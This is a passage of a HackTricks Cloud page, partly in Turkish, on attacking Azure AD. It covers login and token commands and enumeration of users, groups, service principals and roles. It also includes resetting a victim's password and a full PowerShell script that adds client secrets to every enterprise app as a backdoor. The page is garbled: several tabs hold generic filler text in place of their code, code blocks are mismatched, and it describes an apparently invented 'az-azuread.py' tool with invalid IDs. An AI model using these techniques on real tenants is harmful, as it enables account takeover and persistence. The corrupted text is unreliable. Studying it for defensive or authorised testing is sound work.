# Az - AzureAD (AAD)

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## Temel Bilgiler

Azure Active Directory (Azure AD), Microsoft'un kimlik ve erişim yönetimi için bulut tabanlı hizmeti olarak hizmet vermektedir. Çalışanların Microsoft 365, Azure portalı ve birçok diğer SaaS uygulaması dahil olmak üzere, kuruluş içinde ve dışında kaynaklara erişim sağlamalarını sağlamak için önemli bir rol oynamaktadır. Azure AD'nin tasarımı, **kimlik doğrulama, yetkilendirme ve kullanıcı yönetimi** gibi temel kimlik hizmetlerini sunmaya odaklanmaktadır.

Azure AD'nin temel özellikleri arasında **çoklu faktörlü kimlik doğrulama** ve **koşullu erişim** bulunmaktadır ve diğer Microsoft güvenlik hizmetleriyle sorunsuz entegrasyon sağlar. Bu özellikler, kullanıcı kimliklerinin güvenliğini önemli ölçüde artırır ve organizasyonlara erişim politikalarını etkili bir şekilde uygulamalarını ve zorlamalarını sağlar. Microsoft'un bulut hizmetleri ekosisteminin temel bir bileşeni olarak, Azure AD, kullanıcı kimliklerinin bulut tabanlı yönetimi için kilit bir rol oynamaktadır.

## Varlıklar

### Numaralandırma

Bu numaralandırma için [**az cli aracını**](https://docs.microsoft.com/en-us/cli/azure/install-azure-cli)**,** **PowerShell modülü** [**AzureAD**](https://www.powershellgallery.com/packages/AzureAD/) (veya [**AzureAD Preview**](https://www.powershellgallery.com/packages/AzureADPreview)) ve [**Az PowerShell**](https://learn.microsoft.com/en-us/powershell/azure/install-az-ps) modülünü kullanabilirsiniz.

{% hint style="success" %}
Linux'ta PowerShell Core'u yüklemeniz gerekecektir:
```bash
sudo apt-get update
sudo apt-get install -y wget apt-transport-https software-properties-common

# Ubuntu 20.04
wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb

# Update repos
sudo apt-get update
sudo add-apt-repository universe

# Install & start powershell
sudo apt-get install -y powershell
pwsh

# Az cli
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```
{% endhint %}

#### **Modül farkları**

* **AzureAD**, Azure AD nesnelerinin tüm özelliklerini göstermeyen ve Azure kaynakları bilgilerine erişmek için kullanılamayan Microsoft'a ait bir PowerShell modülüdür.
* **Az PowerShell**, PowerShell komut satırından Azure kaynaklarını yönetmek için bir modüldür.

### **Bağlantı**

{% tabs %}
{% tab title="az cli" %}
```bash
az login #This will open the browser
az login -u <username> -p <password> #Specify user and password
az login --identity #Use the current machine managed identity (metadata)
az login --identity -u /subscriptions/<subscriptionId>/resourcegroups/myRG/providers/Microsoft.ManagedIdentity/userAssignedIdentities/myID #Login with user managed identity
# Login as service principal
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p VerySecret --tenant contoso.onmicrosoft.com #With password
az login --service-principal -u http://azure-cli-2016-08-05-14-31-15 -p ~/mycertfile.pem --tenant contoso.onmicrosoft.com #With cert

# Request access token (ARM)
az account get-access-token
# Request access token for different resource. Supported tokens: aad-graph, arm, batch, data-lake, media, ms-graph, oss-rdbms
az account get-access-token --resource-type aad-graph

# If you want to configure some defaults
az configure

# Get user logged-in already
az ad signed-in-user show

# Help
az find "vm" # Find vm commands
az vm -h # Get subdomains
az ad user list --query-examples # Get examples
```
{% endtab %}

{% tab title="Azure AD" %}
{% code overflow="wrap" %} 

## Azure AD

Azure Active Directory (Azure AD) is Microsoft's cloud-based identity and access management service. It helps your employees sign in and access resources.

### Enumeration

1. **User Enumeration**: Enumerate valid usernames using methods like the Azure AD login page, OAuth endpoints, or the Graph API.
2. **Group Enumeration**: Enumerate Azure AD groups to understand the organization's structure and potential attack surface.
3. **Application Enumeration**: Identify applications registered in Azure AD to find potential entry points for attacks.

### Brute Force Attacks

1. **Password Spraying**: Attempting to authenticate using common passwords across multiple accounts.
2. **Credential Stuffing**: Using known username and password combinations to gain unauthorized access.

### Password Attacks

1. **Password Policies**: Check Azure AD password policies to identify weak configurations.
2. **Password Hashes**: Extract password hashes to attempt offline cracking.

### Account Takeover

1. **Phishing**: Use phishing attacks to steal user credentials and gain unauthorized access.
2. **Password Reset**: Exploit weak password reset mechanisms to take over user accounts.

### Privilege Escalation

1. **Role Escalation**: Expjsonit misconfigured roles to gain higher privileges within Azure AD.
2. **Application Permissions**: Expjsonit applications with excessive permissions to escalate privileges.

### Persistence

1. **Backdoors**: Create backdoors in Azure AD configurations to maintain access even after remediation.
2. **Service Principals**: Expjsonit service principals to maintain persistence in Azure AD.

### Data Exfiltration

1. **Export Data**: Extract sensitive data from Azure AD using techniques like OAuth abuse or exploiting misconfigured permissions.
2. **Logs**: Clear logs to cover tracks after exfiltrating data from Azure AD.

### Remediation

1. **Monitor Logs**: Regularly monitor Azure AD logs for suspicious activities.
2. **Security Awareness**: Educate users about phishing attacks and the importance of strong passwords.
3. **Multi-Factor Authentication**: Enforce MFA to add an extra layer of security to user accounts.

{% endcode %}
```powershell
Connect-AzureAD #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds

# Using tokens
## AzureAD cannot request tokens, but can use AADGraph and MSGraph tokens to connect
Connect-AzureAD -AccountId test@corp.onmicrosoft.com -AadAccessToken $token
```
{% endcode %}
{% endtab %}

{% tab title="Az PowerShell" %}
```powershell
Connect-AzAccount #Open browser
# Using credentials
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@corp.onmicrosoft.com", $passwd)
Connect-AzAccount -Credential $creds

# Get Access Token
(Get-AzAccessToken).Token
# Request access token to other endpoints: AadGraph, AnalysisServices, Arm, Attestation, Batch, DataLake, KeyVault, MSGraph, OperationalInsights, ResourceManager, Storage, Synapse
Get-AzAccessToken -ResourceTypeName MSGraph
(Get-AzAccessToken -Resource "https://graph.microsoft.com").Token

# Conenct with access token
Connect-AzAccount -AccountId test@corp.onmicrosoft.com -AccessToken $token
Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
## The -AccessToken is from management.azure.com

# Connect with Service principal/enterprise app secret
$password = ConvertTo-SecureString 'KWEFNOIRFIPMWL.--DWPNVFI._EDWWEF_ADF~SODNFBWRBIF' -AsPlainText -Force
$creds = New-Object
System.Management.Automation.PSCredential('2923847f-fca2-a420-df10-a01928bec653', $password)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 29sd87e56-a192-a934-bca3-0398471ab4e7d

#All the Azure AD cmdlets have the format *-AzAD*
Get-Command *azad*
#Cmdlets for other Azure resources have the format *Az*
Get-Command *az*
```
{% endtab %}

{% tab title="Ham PS" %}
{% code overflow="wrap" %}
```powershell
#Using management
$Token = 'eyJ0eXAi..'
# List subscriptions
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value

# Using graph
Invoke-WebRequest -Uri "https://graph.windows.net/myorganization/users?api-version=1.6" -Headers @{Authorization="Bearer {0}" -f $Token}
```
{% endcode %}
{% endtab %}

{% tab title="Ham OS" %}
{% code overflow="wrap" %}
```bash
# Request tokens to access endpoints
# ARM
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# Vault
curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
```
{% endcode %}
{% endtab %}
{% endtabs %}

Herhangi bir program aracılığıyla Azure'a **CLI** ile giriş yaptığınızda, **Microsoft**'a ait bir **kiracıya** ait bir **Azure Uygulaması** kullanıyorsunuz. Bu Uygulamalar, hesabınızda oluşturabileceğiniz uygulamalar gibi, **bir istemci kimliğine sahiptir**. Konsolda görebileceğiniz **izin verilen uygulamalar listelerinde** hepsini **göremeyeceksiniz**, **ancak varsayılan olarak izin verilirler**.

Örneğin, bir **powershell betiği** kimlik doğrulaması yaparken, **`1950a258-227b-4e31-a9cf-717495945fc2`** istemci kimliğine sahip bir uygulama kullanır. Uygulama konsolda görünmese bile, bir sistem yöneticisi bu uygulamayı **engelleyebilir** ve kullanıcıların bu Uygulama aracılığıyla bağlanan araçları kullanmasını engelleyebilir.

Ancak, Azure'a bağlanmanıza izin verecek **diğer istemci kimlikleri** de bulunmaktadır:
```powershell
# The important part is the ClientId, which identifies the application to login inside Azure

$token = Invoke-Authorize -Credential $credential `
-ClientId '1dfb5f98-f363-4b0f-b63a-8d20ada1e62d' `
-Scope 'Files.Read.All openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "https://graphtryit-staging.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId '65611c08-af8c-46fc-ad20-1888eb1b70d9' `
-Scope 'openid profile Sites.Read.All User.Read email' `
-Redirect_Uri "chrome-extension://imjekgehfljppdblckcmjggcoboemlah" `
-Verbose -Debug `
-InformationAction Continue

$token = Invoke-Authorize -Credential $credential `
-ClientId 'd3ce4cf8-6810-442d-b42e-375e14710095' `
-Scope 'openid' `
-Redirect_Uri "https://graphexplorer.azurewebsites.net/" `
-Verbose -Debug `
-InformationAction Continue
```
### Kullanıcılar

{% tabs %}
{% tab title="az cli" %}
```bash
# Enumerate users
az ad user list --output table
az ad user list --query "[].userPrincipalName"
# Get info of 1 user
az ad user show --id "test@corp.onmicrosoft.com"
# Search "admin" users
az ad user list --query "[].displayName" | findstr /i "admin"
az ad user list --query "[?contains(displayName,'admin')].displayName"
# Search attributes containing the word "password"
az ad user list | findstr /i "password" | findstr /v "null,"
# All users from AzureAD
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi==null]"
az ad user list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All users synced from on-prem
az ad user list --query "[].{osi:onPremisesSecurityIdentifier,upn:userPrincipalName}[?osi!=null]"
az ad user list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get groups where the user is a member
az ad user get-member-groups --id <email>
# Get roles assigned to the user
az role assignment list --include-groups --include-classic-administrators true --assignee <email>
```
{% endtab %}

{% tab title="Azure AD" %}

## Azure AD

Azure AD, Microsoft'un kimlik ve erişim yönetimi bulut hizmetidir. Azure AD, kullanıcı kimliklerini yönetmek, erişim denetimlerini uygulamak ve uygulamalara tek oturum açma sağlamak için kullanılır.

Azure AD'nin güvenliğini değerlendirirken, aşağıdaki konulara odaklanabilirsiniz:

- Kullanıcı hesaplarının güvenliği
- Erişim denetimleri ve roller
- Uygulama entegrasyonu güvenliği
- Günlük izleme ve olay yönetimi

Azure AD'nin güvenliğini test etmek için farklı teknikler ve araçlar kullanılabilir. Bu testler, kullanıcı hesaplarının zayıf şifrelerini tespit etmek, çok faktörlü kimlik doğrulamasını atlamak veya uygulama entegrasyonu zafiyetlerini keşfetmek gibi senaryoları içerebilir.

{% endtab %}
```powershell
# Enumerate Users
Get-AzureADUser -All $true
Get-AzureADUser -All $true | select UserPrincipalName
# Get info of 1 user
Get-AzureADUser -ObjectId test@corp.onmicrosoft.com | fl
# Search "admin" users
Get-AzureADUser -SearchString "admin" #Search admin at the begining of DisplayName or userPrincipalName
Get-AzureADUser -All $true |?{$_.Displayname -match "admin"} #Search "admin" word in DisplayName
# Get all attributes of a user
Get-AzureADUser -ObjectId test@defcorphq.onmicrosoft.com|%{$_.PSObject.Properties.Name}
# Search attributes containing the word "password"
Get-AzureADUser -All $true |%{$Properties = $_;$Properties.PSObject.Properties.Name | % {if ($Properties.$_ -match 'password') {"$($Properties.UserPrincipalName) - $_ - $($Properties.$_)"}}}
# All users from AzureAD# All users from AzureAD
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All users synced from on-prem
Get-AzureADUser -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Objects created by a/any user
Get-AzureADUser [-ObjectId <email>] | Get-AzureADUserCreatedObject
# Devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Objects owned by a specific user
Get-AzureADUserOwnedObject -ObjectId test@corp.onmicrosoft.com
# Get groups & roles where the user is a member
Get-AzureADUserMembership -ObjectId 'test@corp.onmicrosoft.com'
# Get devices owned by a user
Get-AzureADUserOwnedDevice -ObjectId test@corp.onmicrosoft.com
# Get devices registered by a user
Get-AzureADUserRegisteredDevice -ObjectId test@defcorphq.onmicrosoft.com
# Apps where a user has a role (role not shown)
Get-AzureADUser -ObjectId roygcain@defcorphq.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *
# Get Administrative Units of a user
$userObj = Get-AzureADUser -Filter "UserPrincipalName eq 'bill@example.com'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where { $_.Id -eq $userObj.ObjectId } }
```
{% endtab %}

{% tab title="Az PowerShell" %} 

## Az PowerShell

Azure Active Directory (Azure AD) PowerShell module allows you to manage Azure AD users, groups, and licenses. You can use this module to perform various administrative tasks related to Azure AD.

### Installation

To install the Azure AD PowerShell module, you can use the following command:

```powershell
Install-Module -Name Az -AllowClobber -Scope CurrentUser
```

### Connecting to Azure AD

You can connect to Azure AD using the following command:

```powershell
Connect-AzAccount
```

### Managing Azure AD Users

You can get Azure AD users using the following command:

```powershell
Get-AzADUser
```

### Managing Azure AD Groups

You can get Azure AD groups using the following command:

```powershell
Get-AzADGroup
```

### Managing Azure AD Licenses

You can get Azure AD licenses using the following command:

```powershell
Get-AzureADUserLicenseDetail
```

For more information on how to use the Azure AD PowerShell module, you can refer to the official [Microsoft documentation](https://docs.microsoft.com/en-us/powershell/azure/active-directory/overview).

{% endtab %}
```powershell
# Enumerate users
Get-AzADUser
# Get details of a user
Get-AzADUser -UserPrincipalName test@defcorphq.onmicrosoft.com
# Search user by string
Get-AzADUser -SearchString "admin" #Search at the beginnig of DisplayName
Get-AzADUser | ?{$_.Displayname -match "admin"}
# Get roles assigned to a user
Get-AzRoleAssignment -SignInName test@corp.onmicrosoft.com
```
{% endtab %}
{% endtabs %}

#### Kullanıcı Şifresini Değiştirme

{% code overflow="wrap" %}
```powershell
$password = "ThisIsTheNewPassword.!123" | ConvertTo- SecureString -AsPlainText –Force

(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "victim@corp.onmicrosoft.com"}).ObjectId | Set- AzureADUserPassword -Password $password –Verbose
```
### MFA ve Koşullu Erişim Politikaları

Her kullanıcıya MFA eklemek kesinlikle önerilir, ancak bazı şirketler bunu ayarlamayabilir veya belirli bir konumdan, tarayıcıdan veya belirli bir koşuldan giriş yapılıyorsa MFA'yı ayarlayabilir: Kullanıcı, **belirli bir konumdan, tarayıcıdan veya bazı koşullardan** giriş yaparsa MFA **gereklidir**. Bu politikalar, doğru bir şekilde yapılandırılmazsa **atlatmalara** açık olabilir. Kontrol edin:

{% content-ref url="az-conditional-access-policies-mfa-bypass.md" %}
[az-conditional-access-policies-mfa-bypass.md](az-conditional-access-policies-mfa-bypass.md)
{% endcontent-ref %}

### Gruplar

{% tabs %}
{% tab title="az cli" %}
```powershell
# Enumerate groups
az ad group list
az ad group list --query "[].[displayName]" -o table
# Get info of 1 group
az ad group show --group <group>
# Get "admin" groups
az ad group list --query "[].displayName" | findstr /i "admin"
az ad group list --query "[?contains(displayName,'admin')].displayName"
# All groups from AzureAD
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi==null]"
az ad group list --query "[?onPremisesSecurityIdentifier==null].displayName"
# All groups synced from on-prem
az ad group list --query "[].{osi:onPremisesSecurityIdentifier,displayName:displayName,description:description}[?osi!=null]"
az ad group list --query "[?onPremisesSecurityIdentifier!=null].displayName"
# Get members of group
az ad group member list --group <group> --query "[].userPrincipalName" -o table
# Check if member of group
az ad group member check --group "VM Admins" --member-id <id>
# Get which groups a group is member of
az ad group get-member-groups -g "VM Admins"
# Get Apps where a group has a role (role not shown)
Get-AzureADGroup -ObjectId <id> | Get-AzureADGroupAppRoleAssignment | fl *
```
{% endtab %}

{% tab title="Azure AD" %}

Azure AD, Microsoft'un kimlik ve erişim yönetimi bulut hizmetidir. Azure AD, kullanıcı kimliklerini ve erişim haklarını yönetmek için kullanılır. Bu hizmet, kimlik doğrulama, erişim denetimi ve güvenlik politikalarını uygulamayı sağlar.

Azure AD, bulut tabanlı uygulamalar ve hizmetlere tek oturum açma (SSO) deneyimi sunar. Ayrıca çok faktörlü kimlik doğrulama gibi güvenlik özelliklerini destekler.

Azure AD'nin güvenliğini artırmak için, güçlü parolaların yanı sıra çok faktörlü kimlik doğrulama gibi ek güvenlik önlemlerini etkinleştirmek önemlidir. Bu sayede hesapların kötü niyetli kullanımlara karşı daha iyi korunması sağlanabilir.

Azure AD'nin güvenliğini değerlendirmek için, zayıf parolaları, aşırı erişim haklarını veya yanlış yapılandırılmış güvenlik politikalarını araştırmak gibi yöntemler kullanılabilir.

{% endtab %}
```powershell
# Enumerate Groups
Get-AzureADGroup -All $true
# Get info of 1 group
Get-AzADGroup -DisplayName <resource_group_name> | fl
# Get "admin" groups
Get-AzureADGroup -SearchString "admin" | fl #Groups starting by "admin"
Get-AzureADGroup -All $true |?{$_.Displayname -match "admin"} #Groups with the word "admin"
# Get groups allowing dynamic membership
Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'}
# All groups that are from Azure AD
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -eq $null}
# All groups that are synced from on-prem (note that security groups are not synced)
Get-AzureADGroup -All $true | ?{$_.OnPremisesSecurityIdentifier -ne $null}
# Get members of a group
Get-AzureADGroupMember -ObjectId <group_id>
# Get roles of group
Get-AzureADMSGroup -SearchString "Contoso_Helpdesk_Administrators" #Get group id
Get-AzureADMSRoleAssignment -Filter "principalId eq '69584002-b4d1-4055-9c94-320542efd653'"
# Get Administrative Units of a group
$groupObj = Get-AzureADGroup -Filter "displayname eq 'TestGroup'"
Get-AzureADMSAdministrativeUnit | where { Get-AzureADMSAdministrativeUnitMember -Id $_.Id | where {$_.Id -eq $groupObj.ObjectId} }
```
{% endtab %}

{% tab title="Az PowerShell" %} 

Azure AD ile çalışırken, Azure PowerShell modülünü kullanarak bir dizi işlem gerçekleştirebilirsiniz. İşte bazı temel işlemler:

- Yeni bir Azure AD kullanıcısı oluşturma
- Varolan bir kullanıcının bilgilerini güncelleme
- Kullanıcı hesaplarını listeleme ve filtreleme
- Kullanıcı hesaplarını etkinleştirme veya devre dışı bırakma
- Kullanıcı hesaplarını silme

Azure PowerShell modülü, Azure AD ile etkileşimde bulunmak için güçlü bir araçtır ve birçok yönetim görevini otomatikleştirmenize olanak tanır. Bu modülü kullanarak Azure AD güvenliğini güçlendirebilir ve yönetim süreçlerinizi kolaylaştırabilirsiniz.

{% endtab %}
```powershell
# Get all groups
Get-AzADGroup
# Get details of a group
Get-AzADGroup -ObjectId <id>
# Search group by string
Get-AzADGroup -SearchString "admin" | fl * #Search at the beginnig of DisplayName
Get-AzADGroup |?{$_.Displayname -match "admin"}
# Get members of group
Get-AzADGroupMember -GroupDisplayName <resource_group_name>
# Get roles of group
Get-AzRoleAssignment -ResourceGroupName <resource_group_name>
```
#### Kullanıcıyı gruba ekle

Grubun sahipleri yeni kullanıcıları gruba ekleyebilir.
```powershell
Add-AzureADGroupMember -ObjectId <group_id> -RefObjectId <user_id> -Verbose
```
{% endcode %}

{% hint style="warning" %}
Gruplar dinamik olabilir, bu temelde **bir kullanıcı belirli koşulları karşılarsa bir gruba ekleneceği anlamına gelir**. Tabii ki, koşullar **özelliklere** dayanıyorsa ve bir **kullanıcı** bunu **kontrol edebiliyorsa**, bu özelliği **başka gruplara girmek için kötüye kullanabilir**.\
Dinamik grupları nasıl kötüye kullanabileceğinizi kontrol edin:
{% endhint %}

{% content-ref url="dynamic-groups.md" %}
[dynamic-groups.md](dynamic-groups.md)
{% endcontent-ref %}

### Hizmet İlkeleri / Kurumsal Uygulamalar

{% hint style="info" %}
**PowerShell** terimlerinde **Hizmet İlkesi**nin Azure portalında (web) **Kurumsal Uygulamalar** olarak adlandırıldığını unutmayın.
{% endhint %}

{% tabs %}
{% tab title="az cli" %}
```bash
# Get Service Principals
az ad sp list --all
az ad sp list --all --query "[].[displayName]" -o table
# Get details of one SP
az ad sp show --id 00000000-0000-0000-0000-000000000000
# Search SP by string
az ad sp list --all --query "[?contains(displayName,'app')].displayName"
# Get owner of service principal
az ad sp owner list --id <id> --query "[].[displayName]" -o table
# Get service principals owned by the current user
az ad sp list --show-mine
# List apps that have password credentials
az ad sp list --all --query "[?passwordCredentials != null].displayName"
# List apps that have key credentials (use of certificate authentication)
az ad sp list -all --query "[?keyCredentials != null].displayName"
```
{% endtab %}

{% tab title="Azure AD" %}

Azure AD, Microsoft'un kimlik ve erişim yönetimi bulut hizmetidir. Azure AD, kullanıcı kimliklerini ve erişim haklarını yönetmek için kullanılır. Bu hizmet, kimlik doğrulama, erişim denetimi ve güvenlik politikalarını uygulamayı sağlar.

Azure AD, çok faktörlü kimlik doğrulama, tek oturum açma ve erişim denetimi gibi güvenlik özelliklerini destekler. Ayrıca, uygulamaların ve hizmetlerin kimlik doğrulama süreçlerini yönetmek için entegrasyon seçenekleri sunar.

Bu özellikler, Azure AD'nin güvenliğini artırmak ve kimlik hırsızlığı gibi saldırılara karşı koruma sağlamak için kullanılabilir.

{% endtab %}
```powershell
# Get Service Principals
Get-AzureADServicePrincipal -All $true
# Get details about a SP
Get-AzureADServicePrincipal -ObjectId <id> | fl *
# Get SP by string name or Id
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -match "app"} | fl
Get-AzureADServicePrincipal -All $true | ?{$_.AppId -match "103947652-1234-5834-103846517389"}
# Get owner of SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwner |fl *
# Get objects owned by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalOwnedObject
# Get objects created by a SP
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalCreatedObject
# Get groups where the SP is a member
Get-AzureADServicePrincipal | Get-AzureADServicePrincipalMembership
Get-AzureADServicePrincipal -ObjectId <id> | Get-AzureADServicePrincipalMembership |fl *
```
{% endtab %}

{% tab title="Az PowerShell" %} 

Azure AD ile çalışırken, Azure PowerShell modülünü kullanarak bir dizi işlem gerçekleştirebilirsiniz. İşte bazı temel işlemler:

- Yeni bir Azure AD kullanıcısı oluşturma
- Varolan bir kullanıcıyı güncelleme
- Kullanıcı hesabını devre dışı bırakma veya silme
- Grup oluşturma, güncelleme veya silme
- Kullanıcıyı bir gruba ekleme veya gruptan çıkarma

Azure PowerShell modülü, Azure AD ile etkileşimde bulunmak için güçlü bir araçtır ve birçok yönetim görevini otomatikleştirmenize olanak tanır. Bu modülü kullanarak Azure AD ortamınızı daha verimli bir şekilde yönetebilirsiniz.

{% endtab %}
```powershell
# Get SPs
Get-AzADServicePrincipal
# Get info of 1 SP
Get-AzADServicePrincipal -ObjectId <id>
# Search SP by string
Get-AzADServicePrincipal | ?{$_.DisplayName -match "app"}
# Get roles of a SP
Get-AzRoleAssignment -ServicePrincipalName <String>
```
{% endtab %}

{% tab title="Ham" %}Dosya adı: `az-azuread.py`

Bu araç, Azure AD kiracınızda kullanıcılar, gruplar ve uygulamalar hakkında bilgi toplamak için kullanılır. Ayrıca, bu araç, kullanıcıların parolalarını sıfırlamak, kullanıcı hesaplarını kilitlemek ve kullanıcıların oturum açma etkinliğini kontrol etmek gibi bazı işlevleri de gerçekleştirebilir.

### Kullanım

```bash
python3 az-azuread.py -t <tenant_id> -c <client_id> -s <client_secret> -u <username> -p <password> -m <mode>
```

- `tenant_id`: Azure AD kiracı kimliği
- `client_id`: Azure AD uygulama istemci kimliği
- `client_secret`: Azure AD uygulama istemci sırrı
- `username`: Yönetici kullanıcı adı
- `password`: Yönetici parolası
- `mode`: Toplama veya saldırı modu (collect/attack)

### Örnekler

Azure AD kiracı kimliği `12345678-90ab-cdef-ghij-klmnopqrstuv` olan, Azure AD uygulama istemci kimliği `abcdefgh-ijkl-mnop-qrst-uvwxyz123456`, Azure AD uygulama istemci sırrı `s3cr3t`, yönetici kullanıcı adı `admin@domain.com` ve yönetici parolası `P@ssw0rd!` ile çalıştırma örneği:

```bash
python3 az-azuread.py -t 12345678-90ab-cdef-ghij-klmnopqrstuv -c abcdefgh-ijkl-mnop-qrst-uvwxyz123456 -s s3cr3t -u admin@domain.com -p P@ssw0rd! -m collect
```
```powershell
$Token = 'eyJ0eX..'
$URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
Method  = 'GET'
Uri     = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
Bir Hizmet Temsilcisinin Sahibi, şifresini değiştirebilir.
{% endhint %}

<details>

<summary>Her Kurumsal Uygulamada bir istemci sırrı eklemeyi deneyin ve listeyin</summary>
```powershell
# Just call Add-AzADAppSecret
Function Add-AzADAppSecret
{
<#
.SYNOPSIS
Add client secret to the applications.

.PARAMETER GraphToken
Pass the Graph API Token

.EXAMPLE
PS C:\> Add-AzADAppSecret -GraphToken 'eyJ0eX..'

.LINK
https://docs.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0&tabs=http
https://docs.microsoft.com/en-us/graph/api/application-addpassword?view=graph-rest-1.0&tabs=http
#>

[CmdletBinding()]
param(
[Parameter(Mandatory=$True)]
[String]
$GraphToken = $null
)

$AppList = $null
$AppPassword = $null

# List All the Applications

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications"
"Method"  = "GET"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

try
{
$AppList = Invoke-RestMethod @Params -UseBasicParsing
}
catch
{
}

# Add Password in the Application

if($AppList -ne $null)
{
[System.Collections.ArrayList]$Details = @()

foreach($App in $AppList.value)
{
$ID = $App.ID
$psobj = New-Object PSObject

$Params = @{
"URI"     = "https://graph.microsoft.com/v1.0/applications/$ID/addPassword"
"Method"  = "POST"
"Headers" = @{
"Content-Type"  = "application/json"
"Authorization" = "Bearer $GraphToken"
}
}

$Body = @{
"passwordCredential"= @{
"displayName" = "Password"
}
}

try
{
$AppPassword = Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
Add-Member -InputObject $psobj -NotePropertyName "Object ID" -NotePropertyValue $ID
Add-Member -InputObject $psobj -NotePropertyName "App ID" -NotePropertyValue $App.appId
Add-Member -InputObject $psobj -NotePropertyName "App Name" -NotePropertyValue $App.displayName
Add-Member -InputObject $psobj -NotePropertyName "Key ID" -NotePropertyValue $AppPassword.keyId
Add-Member -InputObject $psobj -NotePropertyName "Secret" -NotePropertyValue $AppPassword.secretText
$Details.Add($psobj) | Out-Null
}
catch
{
Write-Output "Failed to add new client secret to '$($App.displayName)' Application."
}
}
if($Details -ne $null)
{
Write-Output ""
Write-Output "Client secret added to : "
Write-Output $Details | fl *
}
}
else
{
Write-Output "Failed to Enumerate the Applications."
}
}
```
</details>

### Roller

{% tabs %}
{% tab title="az cli" %}
```bash
# Get roles
az role definition list
# Get assigned roles
az role assignment list --all --query "[].roleDefinitionName"
az role assignment list --all | jq '.[] | .roleDefinitionName,.scope'
# Get info of 1 role
az role definition list --name "AzureML Registry User"
# Get only custom roles
az role definition list --custom-role-only
# Get only roles assigned to the resource group indicated
az role definition list --resource-group <resource_group>
# Get only roles assigned to the indicated scope
az role definition list --scope <scope>
# Get all the principals a role is assigned to
az role assignment list --all --query "[].{principalName:principalName,principalType:principalType,resourceGroup:resourceGroup,roleDefinitionName:roleDefinitionName}[?roleDefinitionName=='<ROLE_NAME>']"
```
{% endtab %}

{% tab title="Azure AD" %}

Azure AD, Microsoft'un kimlik ve erişim yönetimi bulut hizmetidir. Azure AD, kullanıcı kimliklerini ve erişim haklarını yönetmek için kullanılır. Azure AD'nin güvenliğini değerlendirmek için çeşitli teknikler ve araçlar kullanılabilir. Bu değerlendirme sırasında, kullanıcı hesaplarının güçlü parolalarla korunduğundan, çoklu faktörlü kimlik doğrulamanın etkinleştirildiğinden ve gereksiz ayrıcalıkların atandığından emin olunmalıdır.

{% endtab %}
```powershell
# Get all available role templates
Get-AzureADDirectoryroleTemplate
# Get enabled roles (Assigned roles)
Get-AzureADDirectoryRole
